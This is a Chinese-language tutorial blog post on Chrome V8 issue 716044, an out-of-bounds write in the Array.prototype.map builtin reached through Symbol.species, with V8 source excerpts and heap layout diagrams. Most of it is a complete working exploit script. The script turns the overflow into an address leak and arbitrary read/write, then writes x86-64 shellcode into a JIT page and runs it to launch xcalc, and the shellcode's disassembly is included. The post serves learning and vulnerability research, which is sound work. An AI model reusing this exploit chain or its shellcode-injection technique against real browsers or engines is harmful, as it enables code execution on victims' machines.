> 原文链接: https://www.anquanke.com//post/id/250102 


# Chrome-V8-Issue-716044


                                阅读量   
                                **17065**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01b441150c93437dec.jpg)](https://p2.ssl.qhimg.com/t01b441150c93437dec.jpg)



## 介绍

v8的oob很适合作为入门的漏洞，本漏洞是由于js中的内置函数map，在c++中新增使用类汇编的方式实现map(CodeStubAssembler)，这一改动所产生的漏洞

关于CodeStubAssembler的更多内容可以看[官方文档](https://v8.dev/docs/csa-builtins)

v8入门可以看[从一道CTF题零基础学V8漏洞利用](https://www.freebuf.com/vuls/203721.html)

环境配置如果自己有条件(网速)从外网下载大于2G的源码的话推荐看[[原创]V8环境搭建，100%成功版](https://bbs.pediy.com/thread-252812.htm)

如果没条件的话可以用星阑的一个开源项目👇

[工欲善其事：Github Action 极简搭建 v8 环境](http://mp.weixin.qq.com/s?__biz=Mzg5NjEyMjA5OQ==&amp;mid=2247484916&amp;idx=1&amp;sn=1d07443c7e3817bd4186c616598f4889&amp;chksm=c004a868f773217e8577b404c3032eef5e135311adeab1976c8189c1c0e7fdba3d68ae6d3f16&amp;scene=21#wechat_redirect)

使用方法和仓库都在里面，那么唯一需要改的就是版本号和上述链接中的不同

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0185b2e808e28271be.png)

改为1eb0ef316103caf526f9ab80290b5ba313e232af

[![](https://p1.ssl.qhimg.com/t018124d479ded0c763.png)](https://p1.ssl.qhimg.com/t018124d479ded0c763.png)

如果不是用这一项目搭建，那就

```
git reset --hard 1eb0ef316103caf526f9ab80290b5ba313e232af
gclient sync
```

然后我们还需要安装ninja,这个直接在github上拉下来，也可以拉到码云上再下载

我这里直接用码云上的镜像

```
git clone https://gitee.com/mirrors/ninja.git
cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..
echo 'export PATH=$PATH:"/path/to/ninja"' &gt;&gt; ~/.bashrc
#另外depot_tools的路径也是要写入.bashrc的,没写的话写入
echo 'export PATH=$PATH:"/path/to/depot_tools"' &gt;&gt; ~/.bashrc
```

以上/path/to记得换成自己环境下的路径

开始编译

```
#debug
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
#relase
tools/dev/v8gen.py x64.relase
ninja -C out.gn/x64.relase d8
```

relase和debug版本区别就是relase中不支持job，不好直观的看出对象中的布局，而debug版虽然可以用job看，但是一旦越界读写等有可能直接报错，所以二者可以结合使用



## 漏洞分析

首先我们要知道map的用法

&gt; map() 方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。

也就是说在内部实现会生成一个新数组，对原数组的每个元素进行指定运算后存储在新数组中，而在这里面有些点需要说清

• 在内部生成新数组时，对于默认的数组，其构造函数很显然，但是对于有些数组子类，我们重写了其构造函数，在这时我们需要一个机制来得到这个新的构造函数，来构造一个数组来进行map操作

• 而这个机制，说白了就是调用一个run time func就是v8::internal::Object::ArraySpeciesConstructor

• 而这个函数与数组对象本身联系密切，我们可以把他overwrite掉，这点在下面讲

• 通过这点我们可以使得构造出的数组比原来的短，但是v8本身是肯定有对这种情况的检查的，这点在下面提

```
src/builtins/builtins-array-gen.cc - v8/v8.git - Git at Google (googlesource.com)

TF_BUILTIN(ArrayMap, ArrayBuiltinCodeStubAssembler) `{`
Node* context = Parameter(Descriptor::kContext);
Node* receiver = Parameter(Descriptor::kReceiver);
Node* callbackfn = Parameter(Descriptor::kCallbackFn);
Node* this_arg = Parameter(Descriptor::kThisArg);
Node* new_target = Parameter(Descriptor::kNewTarget);
InitIteratingArrayBuiltinBody(context, receiver, callbackfn, this_arg,
new_target);
GenerateIteratingArrayBuiltinBody( //&lt;-----这里
"Array.prototype.map", &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,
&amp;ArrayBuiltinCodeStubAssembler::MapProcessor,
&amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,
CodeFactory::ArrayMapLoopContinuation(isolate()));
`}`


namespace v8 `{`
namespace internal `{`
class ArrayBuiltinCodeStubAssembler : public CodeStubAssembler `{`
[...]
void GenerateIteratingArrayBuiltinBody(
const char* name, const BuiltinResultGenerator&amp; generator, //generator对应的函数
const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,
const Callable&amp; slow_case_continuation,
ForEachDirection direction = ForEachDirection::kForward) `{`
Label non_array(this), slow(this, `{`&amp;k_, &amp;a_, &amp;to_`}`),
array_changes(this, `{`&amp;k_, &amp;a_, &amp;to_`}`);
[ ... ]
// 1. Let O be ToObject(this value).
// 2. ReturnIfAbrupt(O)

o_ = CallStub(CodeFactory::ToObject(isolate()), context(), receiver());//【1】
// 3. Let len be ToLength(Get(O, "length")).
// 4. ReturnIfAbrupt(len).
VARIABLE(merged_length, MachineRepresentation::kTagged);
Label has_length(this, &amp;merged_length), not_js_array(this);
GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), ¬_js_array);
merged_length.Bind(LoadJSArrayLength(o())); //【2.1】
Goto(&amp;has_length);
BIND(¬_js_array);
Node* len_property =
GetProperty(context(), o(), isolate()-&gt;factory()-&gt;length_string());
merged_length.Bind(
CallStub(CodeFactory::ToLength(isolate()), context(), len_property));
Goto(&amp;has_length);
BIND(&amp;has_length);
len_ = merged_length.value(); //【2.2】
[ ... ]
a_.Bind(generator(this)); //【3】
HandleFastElements(processor, action, &amp;slow, direction);
[ ... ]
```

• o_就是this指针的值

• len_是o_的length

• a_是保存map结果的array

• HandleFastElements 执行map的操作，对o_的每个元素都调用一次processor然后把结果写入a_

看下generator 对应的函数

```
Node* MapResultGenerator() `{`
// 5. Let A be ? ArraySpeciesCreate(O, len).
return ArraySpeciesCreate(context(), o(), len_);
`}`
======================================================
Node* CodeStubAssembler::ArraySpeciesCreate(Node* context, Node* originalArray,
Node* len) `{`
// TODO(mvstanton): Install a fast path as well, which avoids the runtime
// call.
Node* constructor =
CallRuntime(Runtime::kArraySpeciesConstructor, context, originalArray);
return ConstructJS(CodeFactory::Construct(isolate()), context, constructor,
len);
`}`
```

其中，ConstructJS的参数constructor 是通过Array[@@species]得到的，上面也提了，The Array[@@species] accessor property returns the Array constructor.

具体看这里

[![](https://p0.ssl.qhimg.com/t0170961013db5cb5c3.png)](https://p0.ssl.qhimg.com/t0170961013db5cb5c3.png)

我们可以通过定义自己的Array type覆写construct

上面说的v8中有对应的判断新生成的数组长度的操作(其实还是以上漏洞点的引入使得检查不够完善)

```
BranchIfFastJSArray(a(), context(), FastJSArrayAccessMode::ANY_ACCESS,
&amp;fast, &amp;runtime);
BIND(&amp;fast);
`{`
kind = EnsureArrayPushable(a(), &amp;runtime);
elements = LoadElements(a());
GotoIf(IsElementsKindGreaterThan(kind, FAST_HOLEY_SMI_ELEMENTS),
&amp;object_push_pre);
TryStoreArrayElement(FAST_SMI_ELEMENTS, mode, &amp;runtime, elements, k,
mappedValue);
Goto(&amp;finished);
`}`
```

我们走fast，可以跳过BranchIfFastJSArray 检查，然后就可以越界写了

具体如何通过map修改array的长度，直接看exp中注释



## 布局

关于对象在v8中的存储方式可以看这里奇技淫巧学 V8 之二，对象在 V8 内的表达

以下来自Exploiting a V8 OOB write

```
================================================================================
|a_ BuggyArray (0x80) | a_ FixedArray (0x18) | oob_rw JSArray (0x30) |
--------------------------------------------------------------------------------
|oob_rw FixedDoubleArray (0x20) | leak JSArray (0x30) | leak FixedArray (0x18) |
--------------------------------------------------------------------------------
|arb_rw ArrayBuffer |
================================================================================
```

对应的

```
var code = function() `{`
return 1;
`}`
code();
class BuggyArray extends Array `{`
constructor(len) `{`
super(1);
oob_rw = new Array(1.1, 1.1);//浮点数是FixedDoubleArray,改oobrw的length，泄露下面的leak，以及修改arb_rw的backing store pointer去任意读写
leak = new Array(code); //用来leak出函数地址，用来写入shellcode
arb_rw = new ArrayBuffer(4);//buffer
`}`
`}`; //看过v8中的对象布局后，对照这里定义看上面的排布图
```



## 思路

• 通过越界读，修改length构造出任意读写

• 覆写JIT page上的一部分代码，也即写入shellcode

• 调用对应函数执行shellcode

通过function其中的CodeEntry找到JIT区域，然后写入shellcode，我们先得到code函数的地址

```
var js_function_addr = oob_rw[10]; // JSFunction for code() in the `leak` FixedArray.
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017167601a4ec64368.png)

其余内容都在exp的注释里



## exp

```
// v8 exploit for https://crbug.com/716044
var oob_rw = null;
var leak = null;
var arb_rw = null;
var code = function() `{`
return 1;
`}`
code();
class BuggyArray extends Array `{`
constructor(len) `{`
super(1);
oob_rw = new Array(1.1, 1.1); //浮点数是FixedDoubleArray
leak = new Array(code); //用来leak出函数地址，用来写入shellcode
arb_rw = new ArrayBuffer(4); //buffer
`}`
`}`;
//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/@@species
class MyArray extends Array `{`
static get [Symbol.species]() `{`
return BuggyArray;
`}`
`}`
//格式转换，不懂可以看上面的入门文章
var convert_buf = new ArrayBuffer(8);
var float64 = new Float64Array(convert_buf);
var uint8 = new Uint8Array(convert_buf);
var uint32 = new Uint32Array(convert_buf);
function Uint64Add(dbl, to_add_int) `{`
float64[0] = dbl;
var lower_add = uint32[0] + to_add_int;
if (lower_add &gt; 0xffffffff) `{`
lower_add &amp;= 0xffffffff;
uint32[1] += 1;
`}`
uint32[0] = lower_add;
return float64[0];
`}`
// Memory layout looks like this:
// ================================================================================
// |a_ BuggyArray (0x80) | a_ FixedArray (0x18) | oob_rw JSArray (0x30) |
// --------------------------------------------------------------------------------
// |oob_rw FixedDoubleArray (0x20) | leak JSArray (0x30) | leak FixedArray (0x18) |
// --------------------------------------------------------------------------------
// |arb_rw ArrayBuffer |
// ================================================================================
var myarray = new MyArray();
//%DebugPrint(myarray);
myarray.length = 9;
myarray[4] = 42;
myarray[8] = 42;
//%SystemBreak();
//修改oob_rw的length，从上方截图可以看到
myarray.map(function(x) `{` return 1000000; `}`);
//%SystemBreak();
//oob read to get func addr, and we can write it to shellcode
//对于oob_rw偏移为10处是leak，得到地址
var js_function_addr = oob_rw[10]; // JSFunction for code()
// Set arb_rw's kByteLengthOffset to something big.
uint32[0] = 0;
uint32[1] = 1000000;
oob_rw[14] = float64[0];
// Set arb_rw's kBackingStoreOffset to
// js_function_addr + JSFunction::kCodeEntryOffset - 1
// (to get rid of Object tag)
oob_rw[15] = Uint64Add(js_function_addr, 56-1);
//%SystemBreak();
//convert to float
var js_function_uint32 = new Uint32Array(arb_rw);
uint32[0] = js_function_uint32[0];
uint32[1] = js_function_uint32[1];
oob_rw[15] = Uint64Add(float64[0], 128); // 128 = code header size
//%SystemBreak();
//write shellcode
// pop /usr/bin/xcalc
var shellcode = new Uint32Array(arb_rw);
shellcode[0] = 0x90909090;
shellcode[1] = 0x90909090;
shellcode[2] = 0x782fb848;
shellcode[3] = 0x636c6163; //xcalc
shellcode[4] = 0x48500000;
shellcode[5] = 0x73752fb8;
shellcode[6] = 0x69622f72;
shellcode[7] = 0x8948506e;
shellcode[8] = 0xc03148e7;
shellcode[9] = 0x89485750;
shellcode[10] = 0xd23148e6;
shellcode[11] = 0x3ac0c748;
shellcode[12] = 0x50000030; //我改为了0x50000031
shellcode[13] = 0x4944b848;
shellcode[14] = 0x414c5053;
shellcode[15] = 0x48503d59;
shellcode[16] = 0x3148e289;
shellcode[17] = 0x485250c0;
shellcode[18] = 0xc748e289;
shellcode[19] = 0x00003bc0;
shellcode[20] = 0x050f00;
//execute shellcode
code();
```



## shellcode

```
0: 90 nop
1: 90 nop
2: 90 nop
3: 90 nop #(省略四个nop)
4: 48 b8 2f 78 63 61 6c movabs rax, 0x636c6163782f #/xcalc
b: 63 00 00
e: 50 push rax
f: 48 b8 2f 75 73 72 2f movabs rax, 0x6e69622f7273752f #/usr/bin
16: 62 69 6e
19: 50 push rax
1a: 48 89 e7 mov rdi, rsp
1d: 48 31 c0 xor rax, rax
20: 50 push rax
21: 57 push rdi
22: 48 89 e6 mov rsi, rsp
25: 48 31 d2 xor rdx, rdx
28: 48 c7 c0 3a 30 00 00 mov rax, 0x303a # :0 改为-&gt;0x313a
2f: 50 push rax
30: 48 b8 44 49 53 50 4c movabs rax, 0x3d59414c50534944
37: 41 59 3d
3a: 50 push rax
3b: 48 89 e2 mov rdx, rsp
3e: 48 31 c0 xor rax, rax
41: 50 push rax
42: 52 push rdx
43: 48 89 e2 mov rdx, rsp
46: 48 c7 c0 3b 00 00 00 mov rax, 0x3b
4d: 0f 05 syscall
```

这里执行的是DISPLAY=:0 /usr/bin/xcalc，我本地的DISPLAY环境变量是:1，所以这个shellcode在我这会报错，改shellcode,改动在上面有标出

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b1825f988baaa6b4.png)

[![](https://p4.ssl.qhimg.com/t01a9202f7edcd9ad2c.png)](https://p4.ssl.qhimg.com/t01a9202f7edcd9ad2c.png)

**参考**

716044 – V8: OOB write in Array.prototype.map builtin – chromium

Exploiting a V8 OOB write. (halbecaf.com)
